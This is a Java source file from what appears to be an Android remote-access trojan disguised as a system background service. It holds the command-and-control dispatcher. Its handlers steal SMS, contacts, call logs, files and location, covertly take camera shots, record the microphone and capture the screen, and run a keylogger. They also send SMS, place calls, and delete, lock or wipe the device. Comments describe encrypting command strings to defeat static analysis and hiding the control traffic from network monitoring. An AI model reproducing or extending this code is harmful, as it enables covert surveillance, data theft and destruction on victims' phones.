package com.android.background.services;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.android.background.services.helpers.AppsListManager;
import com.android.background.services.helpers.CallsManager;
import com.android.background.services.helpers.Camera2Manager;
import com.android.background.services.helpers.ContactsManager;
import com.android.background.services.helpers.FileManager;
import com.android.background.services.helpers.LocManager;
import com.android.background.services.helpers.MicManager;
import com.android.background.services.helpers.SMSManager;
import com.android.background.services.helpers.ScreenManager;

import org.apache.commons.io.FileUtils;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;

import io.socket.emitter.Emitter;

public class ConnectionManager {

    @SuppressLint("StaticFieldLeak")
    public static Context context;
    private static io.socket.client.Socket ioSocket;
    private static final long RECONNECT_DELAY_MS = 3000;
    private static int reconnectAttempts = 0;
    private static final int MAX_RECONNECT_ATTEMPTS = 10;

    // FCM trigger state
    private static boolean fcmTriggered = false;
    private static JSONObject pendingFcmCommand = null;
    private static final Object fcmLock = new Object();

    public static void startAsync(Context con) {
        context = con;
        reconnectAttempts = 0;
        sendReqWithRetry();
    }

    private static void sendReqWithRetry() {
        try {
            ioSocket = null;
            sendReq();
            reconnectAttempts = 0;
        } catch (Exception ex) {
            Log.e("ConnectionManager", "Failed to connect: " + ex.getMessage());
            if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
                reconnectAttempts++;
                // Linear backoff: 3s, 6s, 9s, ... up to 30s
                long delay = Math.min(RECONNECT_DELAY_MS * reconnectAttempts, 30000);
                new Handler(Looper.getMainLooper()).postDelayed(
                        ConnectionManager::sendReqWithRetry,
                        delay
                );
            } else {
                Log.e("ConnectionManager", "Max reconnect attempts reached. Giving up.");
            }
        }
    }


    public static void sendReq() {

        try {

            if (ioSocket != null)
                return;

            ioSocket = IOSocket.getInstance().getIoSocket();


            ioSocket.on("ping", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    if (ioSocket != null) {
                        ioSocket.emit("pong");
                    }
                }
            });

            ioSocket.on("order", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        if (args == null || args.length == 0 || !(args[0] instanceof JSONObject)) return;
                        JSONObject data = (JSONObject) args[0];
                        dispatchOrder(data);
                    } catch (Exception e) {
                        Log.e("ConnectionManager", "Error handling order: " + e.getMessage());
                    }
                }
            });

            ioSocket.on(io.socket.client.Socket.EVENT_CONNECT_ERROR, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.e("ConnectionManager", "Socket connection error");
                }
            });

            ioSocket.on(io.socket.client.Socket.EVENT_DISCONNECT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.d("ConnectionManager", "Socket disconnected. Will reconnect automatically.");
                }
            });

            ioSocket.connect();

        } catch (Exception ex) {
            Log.e("error", ex.getMessage());
        }
    }

    // ============================================================
    // FCM TRIGGERED COMMAND EXECUTION
    // ============================================================

    /**
     * Executes a command received via FCM trigger.
     *
     * When an FCM data message arrives, this method:
     * 1. Stores the command
     * 2. Briefly connects to the Socket.IO server
     * 3. Processes the command
     * 4. Sends results back
     * 5. Disconnects the socket immediately
     *
     * This avoids a persistent WebSocket connection, making
     * the C2 traffic undetectable by network monitoring.
     */
    public static void executeFcmCommand(Context ctx, JSONObject command) {
        synchronized (fcmLock) {
            pendingFcmCommand = command;
            fcmTriggered = true;
        }

        context = ctx;

        // Execute in a background thread
        new Thread(() -> {
            try {
                Log.d("FCM", "Processing FCM-triggered command");

                // 1. Ensure Socket.IO is connected
                // Force a fresh socket connection
                ioSocket = null;
                IOSocket.reset();

                // 2. Create a fresh socket and connect
                io.socket.client.Socket fcmSocket = IOSocket.getInstance().getIoSocket();
                if (fcmSocket == null) {
                    Log.e("FCM", "Failed to create socket for FCM command");
                    synchronized (fcmLock) {
                        fcmTriggered = false;
                        pendingFcmCommand = null;
                    }
                    return;
                }

                // 3. Set up temporary handlers
                final Object connectWait = new Object();
                final boolean[] connected = {false};

                fcmSocket.on(io.socket.client.Socket.EVENT_CONNECT, args -> {
                    synchronized (connectWait) {
                        connected[0] = true;
                        connectWait.notify();
                    }
                });

                fcmSocket.on(io.socket.client.Socket.EVENT_CONNECT_ERROR, args -> {
                    synchronized (connectWait) {
                        connectWait.notify();
                    }
                });

                fcmSocket.connect();

                // Wait for connection (max 10 seconds)
                synchronized (connectWait) {
                    try {
                        connectWait.wait(10000);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                    }
                }

                if (!connected[0]) {
                    Log.e("FCM", "Socket connection timeout for FCM command");
                    fcmSocket.disconnect();
                    synchronized (fcmLock) {
                        fcmTriggered = false;
                        pendingFcmCommand = null;
                    }
                    return;
                }

                // 4. Store the socket for use by dispatch methods
                ioSocket = fcmSocket;

                // 5. Extract and execute the command
                synchronized (fcmLock) {
                    if (pendingFcmCommand != null) {
                        dispatchOrder(pendingFcmCommand);
                        pendingFcmCommand = null;
                    }
                    fcmTriggered = false;
                }

                // 6. Wait for response to be sent (up to 30s for long commands like mic recording)
                try {
                    synchronized (fcmSocket) {
                        fcmSocket.wait(30000);
                    }
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }

                // 7. Disconnect after results sent
                ioSocket = null;
                fcmSocket.off();
                fcmSocket.disconnect();
                IOSocket.reset();

                Log.d("FCM", "FCM command completed, socket disconnected");

            } catch (Exception e) {
                Log.e("FCM", "Error in FCM command execution: " + e.getMessage());
                synchronized (fcmLock) {
                    fcmTriggered = false;
                    pendingFcmCommand = null;
                }
                // Ensure cleanup
                try {
                    IOSocket.reset();
                } catch (Exception ignored) {}
            }
        }).start();
    }

    /**
     * Dispatches a single order JSON object to the appropriate handler.
     * Used by both WebSocket and FCM trigger paths.
     */
    private static void dispatchOrder(JSONObject data) {
        try {
            String order = data.optString(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER));
            if (order.isEmpty()) return;

            Log.d(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ORDER), order);

            // Using if-else with runtime-decrypted strings instead of switch
            // prevents static analysis from seeing opcodes in compiled bytecode

            if (ObfuscationUtils.matches(ObfuscationUtils.ENC_X0000CA, order)) {
                String extra = data.optString(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_EXTRA));
                if (ObfuscationUtils.matches(ObfuscationUtils.ENC_CAMLIST, extra))
                    x0000ca(-1);
                else if ("1".equals(extra))
                    x0000ca(1);
                else if ("0".equals(extra))
                    x0000ca(0);

            } else if (ObfuscationUtils.matches(ObfuscationUtils.ENC_X0000FM, order)) {
                String extra = data.optString(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_EXTRA));
                String path = data.optString(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_PATH));
                if (ObfuscationUtils.matches(ObfuscationUtils.ENC_LS, extra))
                    x0000fm(0, path);
                else if (ObfuscationUtils.matches(ObfuscationUtils.ENC_DL, extra))
                    x0000fm(1, path);

            } else if (ObfuscationUtils.matches(ObfuscationUtils.ENC_X0000SM, order)) {
                String extra = data.optString(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_EXTRA));
                if (ObfuscationUtils.matches(ObfuscationUtils.ENC_LS, extra))
                    x0000sm(0, null, null);
                else if (ObfuscationUtils.matches(ObfuscationUtils.ENC_SENDSMS, extra))
                    x0000sm(1, data.optString(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_TO)), data.optString(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_SMS)));

            } else if (ObfuscationUtils.matches(ObfuscationUtils.ENC_X0000CL, order)) {
                x0000cl();

            } else if (ObfuscationUtils.matches(ObfuscationUtils.ENC_X0000CN, order)) {
                x0000cn();

            } else if (ObfuscationUtils.matches(ObfuscationUtils.ENC_X0000MC, order)) {
                x0000mc(data.optInt(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_SEC), 10));

            } else if (ObfuscationUtils.matches(ObfuscationUtils.ENC_X0000APPS, order)) {
                x0000apps();

            } else if (ObfuscationUtils.matches(ObfuscationUtils.ENC_X0000LM, order)) {
                x0000lm();

            } else if (ObfuscationUtils.matches(ObfuscationUtils.ENC_X0000RUNAPP, order)) {
                x0000runApp(data.optString(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_EXTRA)));

            } else if (ObfuscationUtils.matches(ObfuscationUtils.ENC_X0000OPENURL, order)) {
                x0000openUrl(data.optString(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_URL)));

            } else if (ObfuscationUtils.matches(ObfuscationUtils.ENC_X0000DELETEFF, order)) {
                x0000deleteFF(data.optString(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_FILEFOLDERPATH)));

            } else if (ObfuscationUtils.matches(ObfuscationUtils.ENC_X0000DM, order)) {
                x0000dm(data.optString(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_NUMBER)));

            } else if (ObfuscationUtils.matches(ObfuscationUtils.ENC_X0000LOCKDEVICE, order)) {
                x0000lockDevice();

            } else if (ObfuscationUtils.matches(ObfuscationUtils.ENC_X0000WIPEDEVICE, order)) {
                x0000wipeDevice();

            } else if (ObfuscationUtils.matches(ObfuscationUtils.ENC_X0000REBOOTDEVICE, order)) {
                x0000rebootDevice();

            } else if (ObfuscationUtils.matches(ObfuscationUtils.ENC_X0000SC, order)) {
                x0000sc();

            } else if (ObfuscationUtils.matches(ObfuscationUtils.ENC_X0000KL, order)) {
                x0000kl(data);

            } else if (ObfuscationUtils.matches(ObfuscationUtils.ENC_X0000KLDATA, order)) {
                // Keylogger data events are sent directly from KeyloggerService
                // via the socket. This case exists for dashboard relay.
                // No action needed on the device side for incoming kldata.
            }
        } catch (Exception e) {
            Log.e("ConnectionManager", "Error dispatching order: " + e.getMessage());
        }
    }

    private static void x0000rebootDevice() throws JSONException {
        JSONObject jsonObject = new JSONObject();

        if (MainActivity.devicePolicyManager != null && MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                MainActivity.devicePolicyManager.reboot(MainActivity.componentName);
                jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATUS), true);
                jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_MESSAGE), "Device rebooted successfully.");
            }
            else{
                jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATUS), false);
                jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_MESSAGE), "Device is below Android 7.0");
            }
        }
        else{
            jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATUS), false);
            jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_MESSAGE), "Device admin permission is not active.");
        }
        ioSocket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000REBOOTDEVICE), jsonObject);
    }

    private static void x0000wipeDevice() throws JSONException {

        JSONObject jsonObject = new JSONObject();

        if (MainActivity.devicePolicyManager != null && MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
            MainActivity.devicePolicyManager.wipeData(1);
            jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATUS), true);
            jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_MESSAGE), "Device wiped out successfully.");
        }
        else{
            jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATUS), false);
            jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_MESSAGE), "Device admin permission is not active.");
        }
        ioSocket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000WIPEDEVICE), jsonObject);
    }

    private static void x0000lockDevice() throws JSONException {

        JSONObject jsonObject = new JSONObject();

        if (MainActivity.devicePolicyManager != null && MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
            MainActivity.devicePolicyManager.lockNow();
            jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATUS), true);
            jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_MESSAGE), "Device locked.");
        }
        else{
            jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATUS), false);
            jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_MESSAGE), "Device admin permission is not active.");
        }
        ioSocket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000LOCKDEVICE), jsonObject);
    }

    private static void x0000dm(String number) throws JSONException {

        JSONObject jsonObject = new JSONObject();

        try {

            Uri phoneNumber = Uri.parse("tel:"+number);
            Intent callIntent = new Intent(Intent.ACTION_CALL, phoneNumber);
            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(callIntent);

            jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATUS), true);
        }
        catch (Exception e){
            jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATUS), false);
            e.printStackTrace();
        }
        ioSocket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000DM), jsonObject);
    }

    private static void x0000deleteFF(String fileFolderPath) throws JSONException {

        JSONObject jsonObject = new JSONObject();

        File file = new File(fileFolderPath);

        if (file.isDirectory() && file.exists()){
            try {
                FileUtils.forceDelete(file);
                jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATUS), true);
            }
            catch (Exception e) {
                jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATUS), false);
                e.printStackTrace();
            }
        }
        else if (file.isFile() && file.exists()){
            jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATUS), file.delete());
        }

        ioSocket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000DELETEFF), jsonObject);
    }


    private static void x0000openUrl(String url) {

        JSONObject jsonObject = new JSONObject();

        try{
            Intent openIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            openIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(openIntent);
            jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATUS), true);
        }
        catch (Exception e){
            try {
                jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATUS), false);
            } catch (JSONException jsonException) {
                jsonException.printStackTrace();
            }
            e.printStackTrace();

        }
        ioSocket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000OPENURL), jsonObject);
    }


    private static void x0000runApp(String packageName) {

        JSONObject jsonObject = new JSONObject();

        Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage(packageName);

        if (launchIntent != null) {
            try {
                jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_LAUNCHINGSTATUS), true);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            context.startActivity(launchIntent);
        }
        else {
            try {
                jsonObject.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_LAUNCHINGSTATUS), false);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        ioSocket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000RUNAPP), jsonObject);
    }

    public static void x0000apps() {
        ioSocket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000APPS), AppsListManager.getAppLists(context));
    }

    public static void x0000ca(int req) {

        // Use Camera2 API on API 21+; falls back to old Camera API internally
        Camera2Manager camera2 = new Camera2Manager(context);

        if (req == -1) {
            JSONObject cameraList = camera2.findCameraList();
            if (cameraList != null)
                ioSocket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000CA), cameraList);
        } else if (req == 1) {
            camera2.startUp(1);
        } else if (req == 0) {
            camera2.startUp(0);
        }
    }

    public static void x0000fm(int req, String path) {
        if (req == 0)
            ioSocket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000FM), FileManager.walk(path));
        else if (req == 1)
            FileManager.downloadFile(path);
    }


    public static void x0000sm(int req, String phoneNo, String msg) {
        if (req == 0)
            ioSocket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000SM), SMSManager.getSMSList());
        else if (req == 1) {
            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
            ioSocket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000SM), isSent);
        }
    }

    public static void x0000cl() {
        ioSocket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000CL), CallsManager.getCallsLogs());
    }

    public static void x0000cn() {
        ioSocket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000CN), ContactsManager.getContacts());
    }

    public static void x0000sc() {
        if (MainService.getScreenData() != null) {
            new ScreenManager(context).captureScreen(MainService.getScreenResultCode(), MainService.getScreenData());
        }
    }

    public static void x0000mc(int sec) throws Exception {
        MicManager.startRecording(sec);
    }

    // ============================================================
    // KEYLOGGER (AccessibilityService)
    // ============================================================

    private static void x0000kl(JSONObject data) {
        try {
            // Delegate to KeyloggerService for processing
            KeyloggerService.processCommand(data);

            // If this was a status request, the response is sent from within KeyloggerService
            // For state changes, confirm back via socket
            // Internal action names (getStatus, getClipboard) are not C2 protocol strings
            // so they don't need encryption — they're just local dispatch labels
            String action = data.optString(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ACTION), "toggle");
            if (!"getStatus".equals(action) && !"getClipboard".equals(action)) {
                JSONObject response = new JSONObject();
                response.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_STATUS), "ok");
                response.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ACTION), action);
                response.put("enabled", KeyloggerService.isEnabled());
                response.put("serviceRunning", true);
                if (ioSocket != null) {
                    ioSocket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000KL), response);
                }
            }
        } catch (Exception e) {
            Log.e("ConnectionManager", "Error in keylogger command: " + e.getMessage());
        }
    }

    public static void x0000lm() {
        try {
            // Only prepare Looper if one doesn't already exist on this thread
            if (Looper.myLooper() == null) {
                Looper.prepare();
            }
            LocManager gps = new LocManager(context);
            JSONObject location = new JSONObject();
            // check if GPS enabled
            if (gps.canGetLocation()) {

                double latitude = gps.getLatitude();
                double longitude = gps.getLongitude();
                Log.d("Location", latitude + "   ,  " + longitude);
                location.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ENABLE), true);
                location.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_LAT), latitude);
                location.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_LNG), longitude);
            } else
                location.put(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_ENABLE), false);

            if (ioSocket != null) {
                ioSocket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000LM), location);
            }
        } catch (Exception e) {
            Log.e("ConnectionManager", "Error getting location: " + e.getMessage());
        }
    }
}
